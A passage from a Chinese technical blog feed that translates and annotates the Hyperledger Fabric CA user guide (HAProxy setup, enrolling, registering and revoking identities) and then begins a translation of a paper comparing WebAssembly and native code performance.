<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global</span><br><span class="line"># 支持的最大连接数</span><br><span class="line">      maxconn 4096 </span><br><span class="line">       # 以守护进程的方式运行</span><br><span class="line">      daemon</span><br><span class="line"></span><br><span class="line">defaults</span><br><span class="line"># 代理模式有http和tcp两种, tls需要tcp模式.http是七层模式，tcp是四层模式，health是健康检测，返回OK</span><br><span class="line">      mode http</span><br><span class="line">      maxconn 2000</span><br><span class="line">      timeout connect 5000</span><br><span class="line">      timeout client 50000</span><br><span class="line">      timeout server 50000</span><br><span class="line"></span><br><span class="line">frontend balancer</span><br><span class="line">      bind *:7054</span><br><span class="line">      mode http</span><br><span class="line">      default_backend servers</span><br><span class="line"></span><br><span class="line">#  定义后端节点</span><br><span class="line"># listen http-in</span><br><span class="line"># 监听7054</span><br><span class="line">backend servers</span><br><span class="line"># 负载均衡的算法: roundrobin: 权重轮训, 动态, static-rr: 权重轮训, 静态</span><br><span class="line"># leastconn:到最少连接数, 动态, 长时间会话</span><br><span class="line"># source: 同一个ip始终到特定服务器.</span><br><span class="line"># uri: 同一uri始终到特定服务器</span><br><span class="line"># hdr:</span><br><span class="line">      balance roundrobin</span><br><span class="line">      server ca1 ca1.example.com:7054</span><br><span class="line">      server ca2 ca2.example.com:7054</span><br><span class="line">      server ca3 ca3.example.com:7054</span><br><span class="line"></span><br><span class="line">listen status</span><br><span class="line">      mode http</span><br><span class="line">      default_backend servers</span><br><span class="line">      bind 0.0.0.0:70</span><br><span class="line">      stats enable</span><br><span class="line">      stats hide-version</span><br><span class="line">      stats uri     &#x2F;stats</span><br><span class="line">      stats auth    admin:password</span><br><span class="line">      stats admin if TRUE</span><br></pre></td></tr></table></figure>
<blockquote>
<p>而且,通过将70端口映射到宿主机访问<code>http://localhost:70/stats</code>, 用户名和密码在haproxy.cfg文件中, 可以查看haproxy的信息<br><img src="haproxy-stats.png"></p>
</blockquote>
<blockquote>
<p>分别登录三个ca1,ca2,ca3执行一次之后</p>
</blockquote>
<p><img src="haproxy-stats-after.png"></p>
<h2 id="设置多个ca"><a href="#设置多个ca" class="headerlink" title="设置多个ca"></a>设置多个ca</h2><p>每个ca服务器默认包含一个ca.然而, 可以使用cafiles或者cacount配置选项来向一个ca服务器中增加多个ca.每个增加的ca都有自己的主目录.</p>
<h3 id="cacout"><a href="#cacout" class="headerlink" title="cacout:"></a>cacout:</h3><p>cacout提供了一种快速x个ca的方案.他的主目录与服务器的主目录相关.当开启这个选项,目录结构如图:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--&lt;Server Home&gt;</span><br><span class="line">  |--ca</span><br><span class="line">    |--ca1</span><br><span class="line">    |--ca2</span><br></pre></td></tr></table></figure>
<p>每个额外的ca都在自己的主目录中生成一个默认的配置文件, 在这个目录文件中, 会包含一个唯一的ca名字.</p>
<p>例如, 如下的命令开启默认开启2个ca实例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fabric-ca-server start -b admin:adminpw --cacount 2</span><br></pre></td></tr></table></figure>
<h3 id="cafiles"><a href="#cafiles" class="headerlink" title="cafiles:"></a>cafiles:</h3><p>在使用cafile配置选项的时候, 没有提供绝对路径,那么ca的目录就是相对于服务器的目录.</p>
<p>为了使用这个选项,必须事先生成ca的配置文件,并且每个将要开启的ca配置好.每个配置文件必须有一个唯一的ca名字和一个common name, 否则就会开启失败, 因为名字必须唯一.ca的配置文件会覆盖所有的ca默认配置文件, 任何在ca配置文件中缺失的选项将会使用ca 的默认值来替换.</p>
<p>优先级如下所示:</p>
<ol>
<li>ca 配置文件</li>
<li>默认的的cli命令</li>
<li>默认的ca环境变量</li>
<li>默认的配置文件</li>
</ol>
<p>一个ca的配置文件必须要有一下几个:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca:</span><br><span class="line"># Name of this CA</span><br><span class="line">name: &lt;CANAME&gt;</span><br><span class="line"></span><br><span class="line">csr:</span><br><span class="line">  cn: &lt;COMMONNAME&gt;</span><br></pre></td></tr></table></figure>

<p>你可以如下配置目录结构:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--&lt;Server Home&gt;</span><br><span class="line">  |--ca</span><br><span class="line">    |--ca1</span><br><span class="line">      |-- fabric-ca-config.yaml</span><br><span class="line">    |--ca2</span><br><span class="line">      |-- fabric-ca-config.yaml</span><br></pre></td></tr></table></figure>

<p>例如: 下面的命令会开启两个自定义的ca实例.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fabric-ca-server start -b admin:adminpw --cafiles ca&#x2F;ca1&#x2F;fabric-ca-config.yaml --cafiles   ca&#x2F;ca2&#x2F;fabric-ca-config.yaml</span><br></pre></td></tr></table></figure>


<h2 id="登录一个中间ca"><a href="#登录一个中间ca" class="headerlink" title="登录一个中间ca"></a>登录一个中间ca</h2><p>为了给一个中间ca创建一个签名证书,这个中间ca必须向一个父级ca登录,与一个fabric-ca 客户端登录的方式相同.这个可以类似下面展示的方式, 使用-u选项来指定父级的ca的URL,登录的id和密码.这个登录id的用户必须有一个名为”hr.IntermediateCA”的属性,它的值是<code>true</code>.颁发的证书的CN(common name)设置为登录id.如果一个中间ca指定名字, 会发生错误.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fabric-ca-server start -b admin:adminpw -u http://&lt;enrollmentID&gt;:&lt;secret&gt;@&lt;parentserver&gt;:&lt;parentport&gt;</span><br></pre></td></tr></table></figure>

<p>更多关于中间ca的标记可以查看<a href="https://hyperledger-fabric-ca.readthedocs.io/en/release-1.0/users-guide.html#fabric-ca-server-s-configuration-file-format">https://hyperledger-fabric-ca.readthedocs.io/en/release-1.0/users-guide.html#fabric-ca-server-s-configuration-file-format</a></p>
<h1 id="fabric-ca-客户端"><a href="#fabric-ca-客户端" class="headerlink" title="fabric ca 客户端"></a>fabric ca 客户端</h1><p>这一部分描述如何使用fabric-ca客户端命令.</p>
<p>fabric-ca的客户端的主目录有以下的顺序决定:</p>
<ul>
<li>如果设置了<code>FABRIC_CA_CLIENT_HOME</code>环境变量,就用这个</li>
<li> 如果设置了<code>FABRIC_CA_HOME</code>环境变量,就用这个</li>
<li> 如果设置了<code>CA_CFG_PATH</code>环境变量,就用这个</li>
<li> 如果设置了<code>$HOME/.fabric-ca-client</code>环境变量,就用这个</li>
</ul>
<p>下面的介绍假定客户端的配置文件存在于客户端的主目录中.</p>
<h2 id="登录启动实体"><a href="#登录启动实体" class="headerlink" title="登录启动实体"></a>登录启动实体</h2><p>首先, 如果需要, 要在client的配置文件中, 自定义csr部分.注意: csr.cn部分必须是启动实体的id.以下是默认的csr值:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csr:</span><br><span class="line">  cn: &lt;&lt;enrollment ID&gt;&gt;</span><br><span class="line">  key:</span><br><span class="line">    algo: ecdsa</span><br><span class="line">    size: 256</span><br><span class="line">  names:</span><br><span class="line">    - C: US</span><br><span class="line">      ST: North Carolina</span><br><span class="line">      L:</span><br><span class="line">      O: Hyperledger Fabric</span><br><span class="line">      OU: Fabric CA</span><br><span class="line">  hosts:</span><br><span class="line">   - &lt;&lt;hostname of the fabric-ca-client&gt;&gt;</span><br><span class="line">  ca:</span><br><span class="line">    pathlen:</span><br><span class="line">    pathlenzero:</span><br><span class="line">    expiry:</span><br></pre></td></tr></table></figure>

<p>可以查看csr部分详细描述.<a href="https://hyperledger-fabric-ca.readthedocs.io/en/release-1.0/users-guide.html#csr-fields">https://hyperledger-fabric-ca.readthedocs.io/en/release-1.0/users-guide.html#csr-fields</a></p>
<p>然后运行<code>fabric-ca-client enroll</code>来登录实体.比如,以下命令,调用运行在locahost:7054的fabric ca 服务,登录一个实体,id是admin,密码是adminpw.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> FABRIC_CA_CLIENT_HOME=<span class="variable">$HOME</span>/fabric-ca/clients/admin</span><br><span class="line">fabric-ca-client enroll -u http://admin:adminpw@localhost:7054</span><br></pre></td></tr></table></figure>
<p>这个登录命令将一个登录证书ecert,相应的私钥,和ca证书存储到fabric ca客户端msp目录.你会看到pem在哪里存储的信息.</p>
<blockquote>
<p> 注释:<br>执行的结果:<br>在fabric-ca中:<br><img src="client-enroll.png"></p>
</blockquote>
<blockquote>
<p>在user表中:<br><img src="user-table-enroll.png"></p>
</blockquote>
<blockquote>
<p>在certificate表中:<br><img src="cert-tabel-enroll.png"></p>
</blockquote>
<blockquote>
<p>登录一个用户的过程是这样的: client端生成一份私钥,存在<code>$FABRIC_CA_CLIENT_HOME/msp/keystore</code>.比方说amin登录就需要指定为amin的值.当然这个值也可以按照上面的规则用环境变量或者命令行参数覆盖.接着,向服务端发起请求.服务端的返回发证机构的一个证书,放在文件夹<code>$FABRIC_CA_CLIENT_HOME/msp/cacerts </code>中,命名为上面请求的<code>&#123;hostname&#125;-&#123;port&#125;.pem</code>,这个证书实际上就是fabric-ca服务端的发证机构的证书,也就是服务端的<code>/etc/hyperledger/fabric-ca-server-config/org1.example.com-cert.pem</code>这个文件.还有一个是fabric-ca服务端给客户端的证书<code>$FABRIC_CA_CLIENT_HOME/msp/signcerts/cert.pem </code>,会存放在这个证书是在issure是fabric-ca服务端,subject(证书持有者)是admin用户.<br><img src="ca-client-admin-cert.png"></p>
</blockquote>
<h2 id="注册一个新的用户"><a href="#注册一个新的用户" class="headerlink" title="注册一个新的用户"></a>注册一个新的用户</h2><p>执行注册的身份必须已经登录,也必须要有相应的权限来注册这种类型的用户.</p>
<p>通常, 在fabric ca server注册期间会实行两个授权检查:</p>
<ol>
<li>登录的身份必须要有hf.Registrar.Roles属性,可以用逗号分隔,其中一个值是正在注册的值.例如, 调用身份的hf.Registrar.Roles属性值是peer,app,user”,那么只能注册这其中的一个, 不能是order</li>
<li>调用者身份的隶属关系必须等于被登记身份的隶属关系的前缀.例如, ，具有“a.b”属性的调用者可以注册与“a.b.c”属性相同的身份，但不可以注册属于“a.c”属性的身份。</li>
</ol>
<p>例如, 下面的命令用admin证书,注册一个新的用户,enrollment id 是admin2, 类型user, 丛书关系 org1.department, 属性名字hr.Revoker为true,还有一个属性foo,值是bar</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export FABRIC_CA_CLIENT_HOME&#x3D;$HOME&#x2F;fabric-ca&#x2F;clients&#x2F;admin</span><br><span class="line">fabric-ca-client register --id.name admin2 --id.type user --id.affiliation org1.department1 --id.attrs &#39;hf.Revoker&#x3D;true,foo&#x3D;bar&#39;</span><br></pre></td></tr></table></figure>
<p>密码, 或者登陆凭证, 会被打印.这个密码可以用来注册.这可以让管理员注册身份并把enrollment ID和密码给别人注册.</p>
<blockquote>
<p> 注释:<br>fabric-ca的输出:<br><img src="admin2-reg.png"></p>
</blockquote>
<blockquote>
<p>user表的内容:<br><img src="user-table-admin2-reg.png"></p>
</blockquote>
<p>certficate表没有变化</p>
<p>多个属性可以用id.attrs flag的一部分, 并且用分号分隔.对于包含逗号的属性, 要用双引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fabric-ca-client register -d --id.name admin2 --id.type user --id.affiliation org1.department1 --id.attrs &#39;&quot;hf.Registrar.Roles&#x3D;peer,user&quot;,hf.Revoker&#x3D;true&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fabric-ca-client register -d --id.name admin2 --id.type user --id.affiliation org1.department1 --id.attrs &#39;&quot;hf.Registrar.Roles&#x3D;peer,user&quot;&#39; --id.attrs hf.Revoker&#x3D;true</span><br></pre></td></tr></table></figure>

<p>可以在客户端配置文件中设置默认值,如下是一个支持的配置文件格式</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span></span><br><span class="line">  <span class="attr">name:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">user</span></span><br><span class="line">  <span class="attr">affiliation:</span> <span class="string">org1.department1</span></span><br><span class="line">  <span class="attr">maxenrollments:</span> <span class="number">-1</span></span><br><span class="line">  <span class="attr">attributes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">hf.Revoker</span></span><br><span class="line">      <span class="attr">value:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">anotherAttrName</span></span><br><span class="line">      <span class="attr">value:</span> <span class="string">anotherAttrValue</span></span><br></pre></td></tr></table></figure>
<p>一下命令会注册一个新的用户,注册id时admin3,有cli指定,从配置文件读取其余的参数.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export FABRIC_CA_CLIENT_HOME&#x3D;$HOME&#x2F;fabric-ca&#x2F;clients&#x2F;admin</span><br><span class="line">fabric-ca-client register --id.name admin3</span><br></pre></td></tr></table></figure>
<p>要注册具有多个属性的标识，需要在配置文件中指定所有属性名称和值，如上所示.</p>
<p>将maxenrollments设置为0或将其从配置中删除将导致身份被注册为使用CA的最大注册值。此外，注册身份的最大注册值不能超过CA的最大注册值。例如，如果CA的最大注册值为5.任何新身份的值必须小于或等于5，也不能将其设置为-1（无限注册）。</p>
<p>接下来，让我们注册一个peer身份，这将用于在以下部分注册用户。以下的命令注册了peer1.注意, 我们自己指定密码而不是让服务器生成.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> FABRIC_CA_CLIENT_HOME=<span class="variable">$HOME</span>/fabric-ca/clients/admin</span><br><span class="line">fabric-ca-client register --id.name peer1 --id.type peer --id.affiliation org1.department1 --id.secret peer1pw</span><br></pre></td></tr></table></figure>
<blockquote>
<p>说明<br>在fabric-ca中输出:</p>
</blockquote>
<p><img src="peer-reg.png"></p>
<blockquote>
<p>在user表中:</p>
</blockquote>
<p><img src="user-table-peer-reg.png"></p>
<h2 id="注册peer用户"><a href="#注册peer用户" class="headerlink" title="注册peer用户"></a>注册peer用户</h2><p>既然已经注册peer用户, 可以使用给定的enrollment ID和密码enroll.这个与enroll启动身份很相似,除了我们演示的用-m 选项来指定hyperledger fabric msp部分的目录结构.</p>
<p>以下的命令enroll peer1.确认要把-m中的目录指定到自己的peer 的msp目录中, msp路径在peer的core.yaml文件中.你也可以设置FABRIC_CA_CLIENT_HOME.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export FABRIC_CA_CLIENT_HOME&#x3D;$HOME&#x2F;fabric-ca&#x2F;clients&#x2F;peer1</span><br><span class="line">fabric-ca-client enroll -u http:&#x2F;&#x2F;peer1:peer1pw@localhost:7054 -M $FABRIC_CA_CLIENT_HOME&#x2F;msp</span><br></pre></td></tr></table></figure>

<p>登录一个order也是类似的,除了在order.yaml中指定LocalMSPDir的不同.</p>
<blockquote>
<p>注释:<br> 注册用户的过程是这样的: peer1用户借助admin用户来注册.先前amdin用户登录之后, 在本地就存了一份admin用户的证书.如果没有证书,会提示重新登录<br><img src="not-enroll.png"><br> 一份默认的配置文件,就是<code>/root/fabric-ca/clients/peer1/fabric-ca-client-config.yaml</code>,通过读取配置中<code>csr.cn</code>的值,指定登录的身份,当然,在这里只能为admin,而不能是其他用户,因为只有admin的属性中带有了注册其他角色的权限(可以查看user表中的attribute字段).服务端返回的响应是给peer1用户的一个证书.可以看出发证机构是<code>ca.org1.example.com</code>,而证书的持有者就是<code>peer1</code><br><img src="peer1-cert.png"></p>
</blockquote>
<h2 id="从另一个ca服务器获得一个ca证书"><a href="#从另一个ca服务器获得一个ca证书" class="headerlink" title="从另一个ca服务器获得一个ca证书"></a>从另一个ca服务器获得一个ca证书</h2><p>通常，MSP目录的cacerts目录必须包含其他证书颁发机构的证书颁发机构链，代表所有peer节点的所有信任根。</p>
<p><code>fabric-ca-client getcacerts</code>这个命令可以获取从其他fabric-ca服务器的证书链.</p>
<p>例如, 以下会在locahost启动第二个ca服务器在端口7055,名为CA2..这表示一个完全独立的信任根，并由区块链上的其他成员管理。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export FABRIC_CA_SERVER_HOME&#x3D;$HOME&#x2F;ca2</span><br><span class="line">fabric-ca-server start -b admin:ca2pw -p 7055 -n CA2</span><br></pre></td></tr></table></figure>
<p>以下命令将CA2的证书链安装到peer1的MSP目录中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export FABRIC_CA_CLIENT_HOME&#x3D;$HOME&#x2F;fabric-ca&#x2F;clients&#x2F;peer1</span><br><span class="line">fabric-ca-client getcacert -u http:&#x2F;&#x2F;localhost:7055 -M $FABRIC_CA_CLIENT_HOME&#x2F;msp</span><br></pre></td></tr></table></figure>

<h2 id="重新enroll一个实体"><a href="#重新enroll一个实体" class="headerlink" title="重新enroll一个实体"></a>重新enroll一个实体</h2><p>假如你的证书要过期或者撤销,可以使用下面的命令更新证书.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export FABRIC_CA_CLIENT_HOME&#x3D;$HOME&#x2F;fabric-ca&#x2F;clients&#x2F;peer1</span><br><span class="line">fabric-ca-client reenroll</span><br></pre></td></tr></table></figure>
<blockquote>
<p>结果如图所示:<br><img src="reenroll.png"></p>
</blockquote>
<h2 id="撤销一个证书"><a href="#撤销一个证书" class="headerlink" title="撤销一个证书"></a>撤销一个证书</h2><p>一个实体或者证书都是可以撤销的.撤销一个实体会撤销这个实体所拥有的所有证书,并且会阻止这个实体获取新的证书.撤销证书只是让证书失效</p>
<p>为了撤销证书, 实体必须要有hrRevoke属性.撤销身份只能撤销证书或身份，其身份与撤销身份的隶属关系相同或以前缀为准。例如,具有隶属关系orgs.org1的撤销者可以撤销与orgs.org1或orgs.org1.department1相关联的身份，但不能撤销与orgs.org2相关的身份。<br>以下的命令会撤销一个实体并且撤销与此实体相关的所有证书.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fabric-ca-client revoke -e &lt;enrollment_id&gt; -r &lt;reason&gt;</span><br></pre></td></tr></table></figure>

<p>以下是-r 标记可以使用的原因:</p>
<ol>
<li>unspecified : 未指明</li>
<li>keycompromise : 秘钥无效</li>
<li>cacompromise : ca 无效</li>
<li>affiliationchange : 改变隶属关系</li>
<li>superseded :被替代</li>
<li>cessationofoperation : 操作终止</li>
<li>certificatehold </li>
<li>removefromcrl</li>
<li>privilegewithdrawn</li>
<li>aacompromise</li>
</ol>
<p>例如,与从属关系树相关的启动admin可以撤销peer1的身份.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export FABRIC_CA_CLIENT_HOME&#x3D;$HOME&#x2F;fabric-ca&#x2F;clients&#x2F;admin</span><br><span class="line">fabric-ca-client revoke -e peer1</span><br></pre></td></tr></table></figure>
<blockquote>
<p><img src="revoke.png"><br><img src="revoke-mysql.png"></p>
</blockquote>
<p>通过指定其AKI（授权密钥标识符）和序列号，可以撤销属于某个身份的注册证书，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fabric-ca-client revoke -a xxx -s yyy -r &lt;reason&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>例如，您可以使用openssl命令获取AKI和证书的序列号，并将它们传递给revoke命令以撤消该证书，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">serial&#x3D;$(openssl x509 -in userecert.pem -serial -noout | cut -d &quot;&#x3D;&quot; -f 2)</span><br><span class="line">aki&#x3D;$(openssl x509 -in userecert.pem -text | awk &#39;&#x2F;keyid&#x2F; &#123;gsub(&#x2F; *keyid:|:&#x2F;,&quot;&quot;,$1);print tolower($0)&#125;&#39;)</span><br><span class="line">fabric-ca-client revoke -s $serial -a $aki -r affiliationchange</span><br></pre></td></tr></table></figure>
<h2 id="使用tls"><a href="#使用tls" class="headerlink" title="使用tls"></a>使用tls</h2><p>以下可以在 fabric-ca-client-config.yaml 中配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tls:</span><br><span class="line">  # Enable TLS (default: false)</span><br><span class="line">  enabled: true</span><br><span class="line">  certfiles:</span><br><span class="line">    - root.pem</span><br><span class="line">  client:</span><br><span class="line">    certfile: tls_client-cert.pem</span><br><span class="line">    keyfile: tls_client-key.pem</span><br></pre></td></tr></table></figure>
<p>这个证书选项就是一系列被client信任的root证书.这通常只是在ca-cert.pem文件中的服务器主目录中找到的根结构CA服务器的证书。</p>
<p>只有服务端配置了tls, 才需要在客户端配置</p>
<h2 id="联系指定的ca实例"><a href="#联系指定的ca实例" class="headerlink" title="联系指定的ca实例"></a>联系指定的ca实例</h2><p>等运行在一个服务器上多个ca,可以指定ca.默认,如果ca的名字没有在客户端的请求中指定,就会请求fabric-ca服务端的默认ca.一个ca 的名字可以客户端的命令行中指定</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fabric-ca-client enroll -u http:&#x2F;&#x2F;admin:adminpw@localhost:7054 --caname &lt;caname&gt;</span><br></pre></td></tr></table></figure>

<h1 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h1><ol>
<li><p>在2018-7, fabric更新到了1.2.<a href="https://hyperledger-fabric-ca.readthedocs.io/en/release-1.2/users-guide.html">文档</a>也更加丰富,更加人性化.建议先去看一下.</p>
</li>
<li><p>之前的中文翻译文档:<a href="https://hyperledgercn.github.io/hyperledgerDocs/">https://hyperledgercn.github.io/hyperledgerDocs/</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>hyperledger</category>
        <category>fabric</category>
      </categories>
      <tags>
        <tag>翻译</tag>
      </tags>
  </entry>
  <entry>
    <title>not-so-fast-wasm-vs-native</title>
    <url>/2020/11/15/not-so-fast-wasm-vs-native/</url>
    <content><![CDATA[<blockquote>
<p>原文: <a href="https://www.usenix.org/system/files/atc19-jangda.pdf">https://www.usenix.org/system/files/atc19-jangda.pdf</a></p>
</blockquote>
<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>现在，所有主要的Web浏览器都支持WebAssembly，这是一种低级字节码，可以由C和C++代码的编译生成。WebAssembly的一个关键目标是与本机原生代码实现性能均等。之前的工作报告显示他们是几乎是等价的，许多编译到WebAssembly的应用程序的运行速度比原始代码平均慢10％。但是，这些评估仅限于一组科学内核，每个内核包含大约100行代码。无法运行大型的应用程序，将代码编译为WebAssembly是难题的一部分,另外标准的Unix API在Web浏览器环境中不可用。为了应对这一挑战，我们构建了BROWSIX-WASM，这是对[BROWSIX][29]的重要扩展，这是第一次, 使在浏览器内直接运行的WebAssembly编译的Unix应用程序。 然后，我们使用BROWSIX-WASM对WebAssemblyvs的性能进行首次大规模评估。在SPEC CPU基准测试套件中，我们发现了巨大的性能差距：编译为WebAssembly的应用程序的运行速度平均降低了45％（Firefox）至55％（Chrome），峰值速度降低了2.08×（Firefox）和2.5×（Chrome ）。我们确定了造成这种性能下降的原因，其中一些是由于缺少优化和代码生成问题而引起的，而另一些是由于WebAssembly所固有的。</p>
<a id="more"></a>

<p><img data-src="./fig1.png" alt="图片1"></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Web浏览器已成为用户面对的应用程序的最受欢迎的平台，并且直到现在，JavaScript还是所有主流Web浏览器支持的唯一编程语言。<br>除了从编程语言设计的角度来看的许多怪异和陷阱之外，JavaScript众所周知也很难有效地进行[编译][12,17,30,31]。 用JavaScript编写或编译的应用程序通常比其本机对应程序运行得慢得多。 为了解决这种情况，一群浏览器供应商联合开发了WebAssembly。</p>
<p>WebAssembly是不需要垃圾回收机制的静态类型语言，并且支持与JavaScript的互操作性。 WebAssembly的目标是成为可以在浏览器中运行的通用编译器目标[15,16,18]。为此，WebAssembly旨在快速编译和运行，可跨浏览器和体系结构移植, 保证类型和内存安全。 之前讨论到,在浏览器中以原生代码速度运行的尝试,[4,13,14,38]并不能满足所有这些标准。</p>
<p>现在，所有主要浏览器都支持WebAssembly [8,34]，并且已被多种编程语言迅速支持。 现在有针对WebAssembly的C，C ++，C＃，Go和Rust [1,2,24,39]后端。 目前，一个策展人包括十多个其他人(什么鬼)[10]。 如今，使用这些语言编写的代码只要编译为WebAssembly，就可以在任何现代的浏览器沙箱中安全地执行。</p>
<p>WebAssembly的主要目标是比JavaScript更快。 例如，介绍Web-Assembly的论文[18]表明，将C程序编译为WebAssembly而不是JavaScript（asm.js）时，它在Google Chrome浏览器中的运行速度提高了34％。 该论文还表明，WebAssembly的性能与原生代码相比也具有竞争力：在评估的24个基准测试中，使用WebAssembly的七个基准的运行时间在本机代码的10％以内，并且几乎所有这些测试都低于本机代码的2倍。图1显示了WebAssembly实现相对于这些基准的不断改进。 在2017年，只有七个基准测试的性能是原生指标的1.1倍以内，但到2019年，这个数字增加到了13个。</p>
<p><strong>测试WebAssembly的挑战</strong> 前面提到的24个基准测试套件是PolybenchCbenchmark套件[5]，该套件用于测量编译器中多面体循环优化的效果。 该套件中的所有基准都是小型科学计算内核，而不是完整的应用程序（例如，矩阵乘法和LU分解）； 每个大约100LOC。 尽管WebAssembly旨在加速Web上的科学内核，但它也明确地设计用于更丰富的完整应用程序集。</p>
<p>WebAssembly文档重点介绍了几种预期的用例[7]，包括科学内核，图像编辑，视频编辑，图像识别，科学可视化，模拟，编程语言解释器，虚拟机和POSIX应用程序。 因此，WebAssembly在PolybenchC中的科学内核上的出色性能并不意味着它在使用其他类型的应用程序时也能很好地运行。</p>
<p>我们认为，对Web-Assembly的更全面评估应该依赖于已建立的大型程序基准套件，例如SPEC CPU基准套件。事实上，SPEC CPU 2006和2017基准套件包括以下几个应用程序： WebAssembly的八个基准测试是科学应用程序（例如433.milc，444.namd，447.dealII，450.soplex和470.lbm），两个基准测试涉及图像和视频处理（464.h264refand453.povray）， 并且所有基准测试都是POSIX应用程序。</p>
<p>不幸的是，不可能简单地将复杂的本机程序编译为WebAssembly。 本机程序（包括SPEC CPU套件中的程序）需要操作系统服务，例如文件系统，同步I/O和进程，而WebAssembly和浏览器不提供这些服务。 SPEC基准测试工具本身需要文件系统，外壳程序，产生进程的能力以及其他Unix设施。 为了克服将本机应用程序移植到Web时的这些限制，许多程序员都在艰苦地修改其程序，以避免或模仿丢失的操作系统服务。 修改众所周知的基准，例如SPEC CPU，不仅会很耗时，而且会严重影响有效性。</p>
<p>今天运行这些应用程序的标准方法是使用Emscripten，这是一个用于将C和C ++编译为WebAssembly的工具链。 不幸的是，Emscripten仅支持最简单的系统调用，而无法扩展到大型应用程序。 例如，要使应用程序能够使用同步I/O，默认的EmscriptenMEMFS文件系统会在程序开始执行之前将整个文件系统映像加载到内存中。 对于SPEC，这些文件太大而无法放入内存。</p>
<p>一种有前途的替代方法是使用BROWSIX，该框架可在浏览器中运行未修改的，功能齐全的Unix应用程序[28,29]。BROWSIX在JavaScript中实现了与Unix兼容的内核，并完全支持进程，文件，管道，同步I / O和其他Unix功能。 而且，它包括一个C / C ++编译器（基于Emscripten），它允许程序在浏览器中运行而无需修改。 BROWSIX案例研究包括复杂的应用程序，例如LATEX，它完全在浏览器中运行，而无需任何源代码修改。</p>
<p>不幸的是，BROWSIX是仅JavaScript的解决方案，因为它是在WebAssembly发布之前构建的。 此外，BROWSIX有高性能开销，这在进行基准测试时将是一个很大的影响因素。使用BROWSIX，很难将性能不佳的基准与BROWSIX引入的性能下降区分开来。</p>
<p><strong>BROWSIX-WASM:</strong> 我们开发了BROWSIX-WASM, 他是BROWSIX的显着扩展和增强，使我们能够将Unix程序编译为Web-Assembly，并在浏览器中运行它们而无需进行任何修改。 除了集成功能扩展之外，BROWSIX-WASM还提供了可大幅提高其性能的性能优化，从而确保CPU密集型应用程序的运行几乎没有BROWSIX-WASM带来的影响。</p>
<p><strong>BROWSIX-SPEC</strong> 我们开发了BROWSIX-SPEC，这是一个扩展了BROWSIX-WASM的工具，可以自动收集详细的时序和硬件片上性能计数器信息，以便对应用程序性能进行详细测量（第3节）。</p>
<p><strong>WebAssembly的性能分析</strong>：使用BROWSIX-WASM和BROWSIX-SPEC，我们使用SPEC CPU基准套件（2006年和2017年）进行了Web-Assembly的首次综合性能分析。 该评估证实，WebAssembly的运行速度比JavaScript快（在SPEC CPU上平均快1.3倍）。 但是，与先前的工作相反，我们发现WebAssembly和本机性能之间存在巨大差距：编译为WebAssembly的代码在Chrome中的运行速度平均比本机代码慢1.55倍，在Firefox中运行速度比本机代码慢1.45倍（第4节）。</p>
<p><strong>根本原因分析和对实施者的建议</strong>：我们借助性能计数器结果进行辩证分析，以找出造成这种性能差距的根本原因。 我们发现以下结果：</p>
<ol>
<li>WebAssembly生成的指令比本地代码需要更多的加载和存储（Chrome中有2.02倍的加载和2.30倍的存储；在Firefox中有1.92倍的加载和2.16倍的存储）。 我们将其归因于减少了寄存器的可用性，次优的寄存器分配器以及无法有效利用更广泛的x86寻址模式。</li>
<li>WebAssembly产生的指令具有更多分支，因为WebAssembly需要多次动态安全检查。</li>
<li>WebAssembly产生了更多指令，这会导致更多的L1指令高速缓存未命中。我们提供指南，以帮助WebAssembly实现者集中精力进行优化工作，以缩小WebAssembly与本机代码之间的性能差距（第5,6节）。BROWSIX-WASM和BROWSIX-SPEC可在<a href="https://browsix.org/">https://browsix.org</a> 获得</li>
</ol>
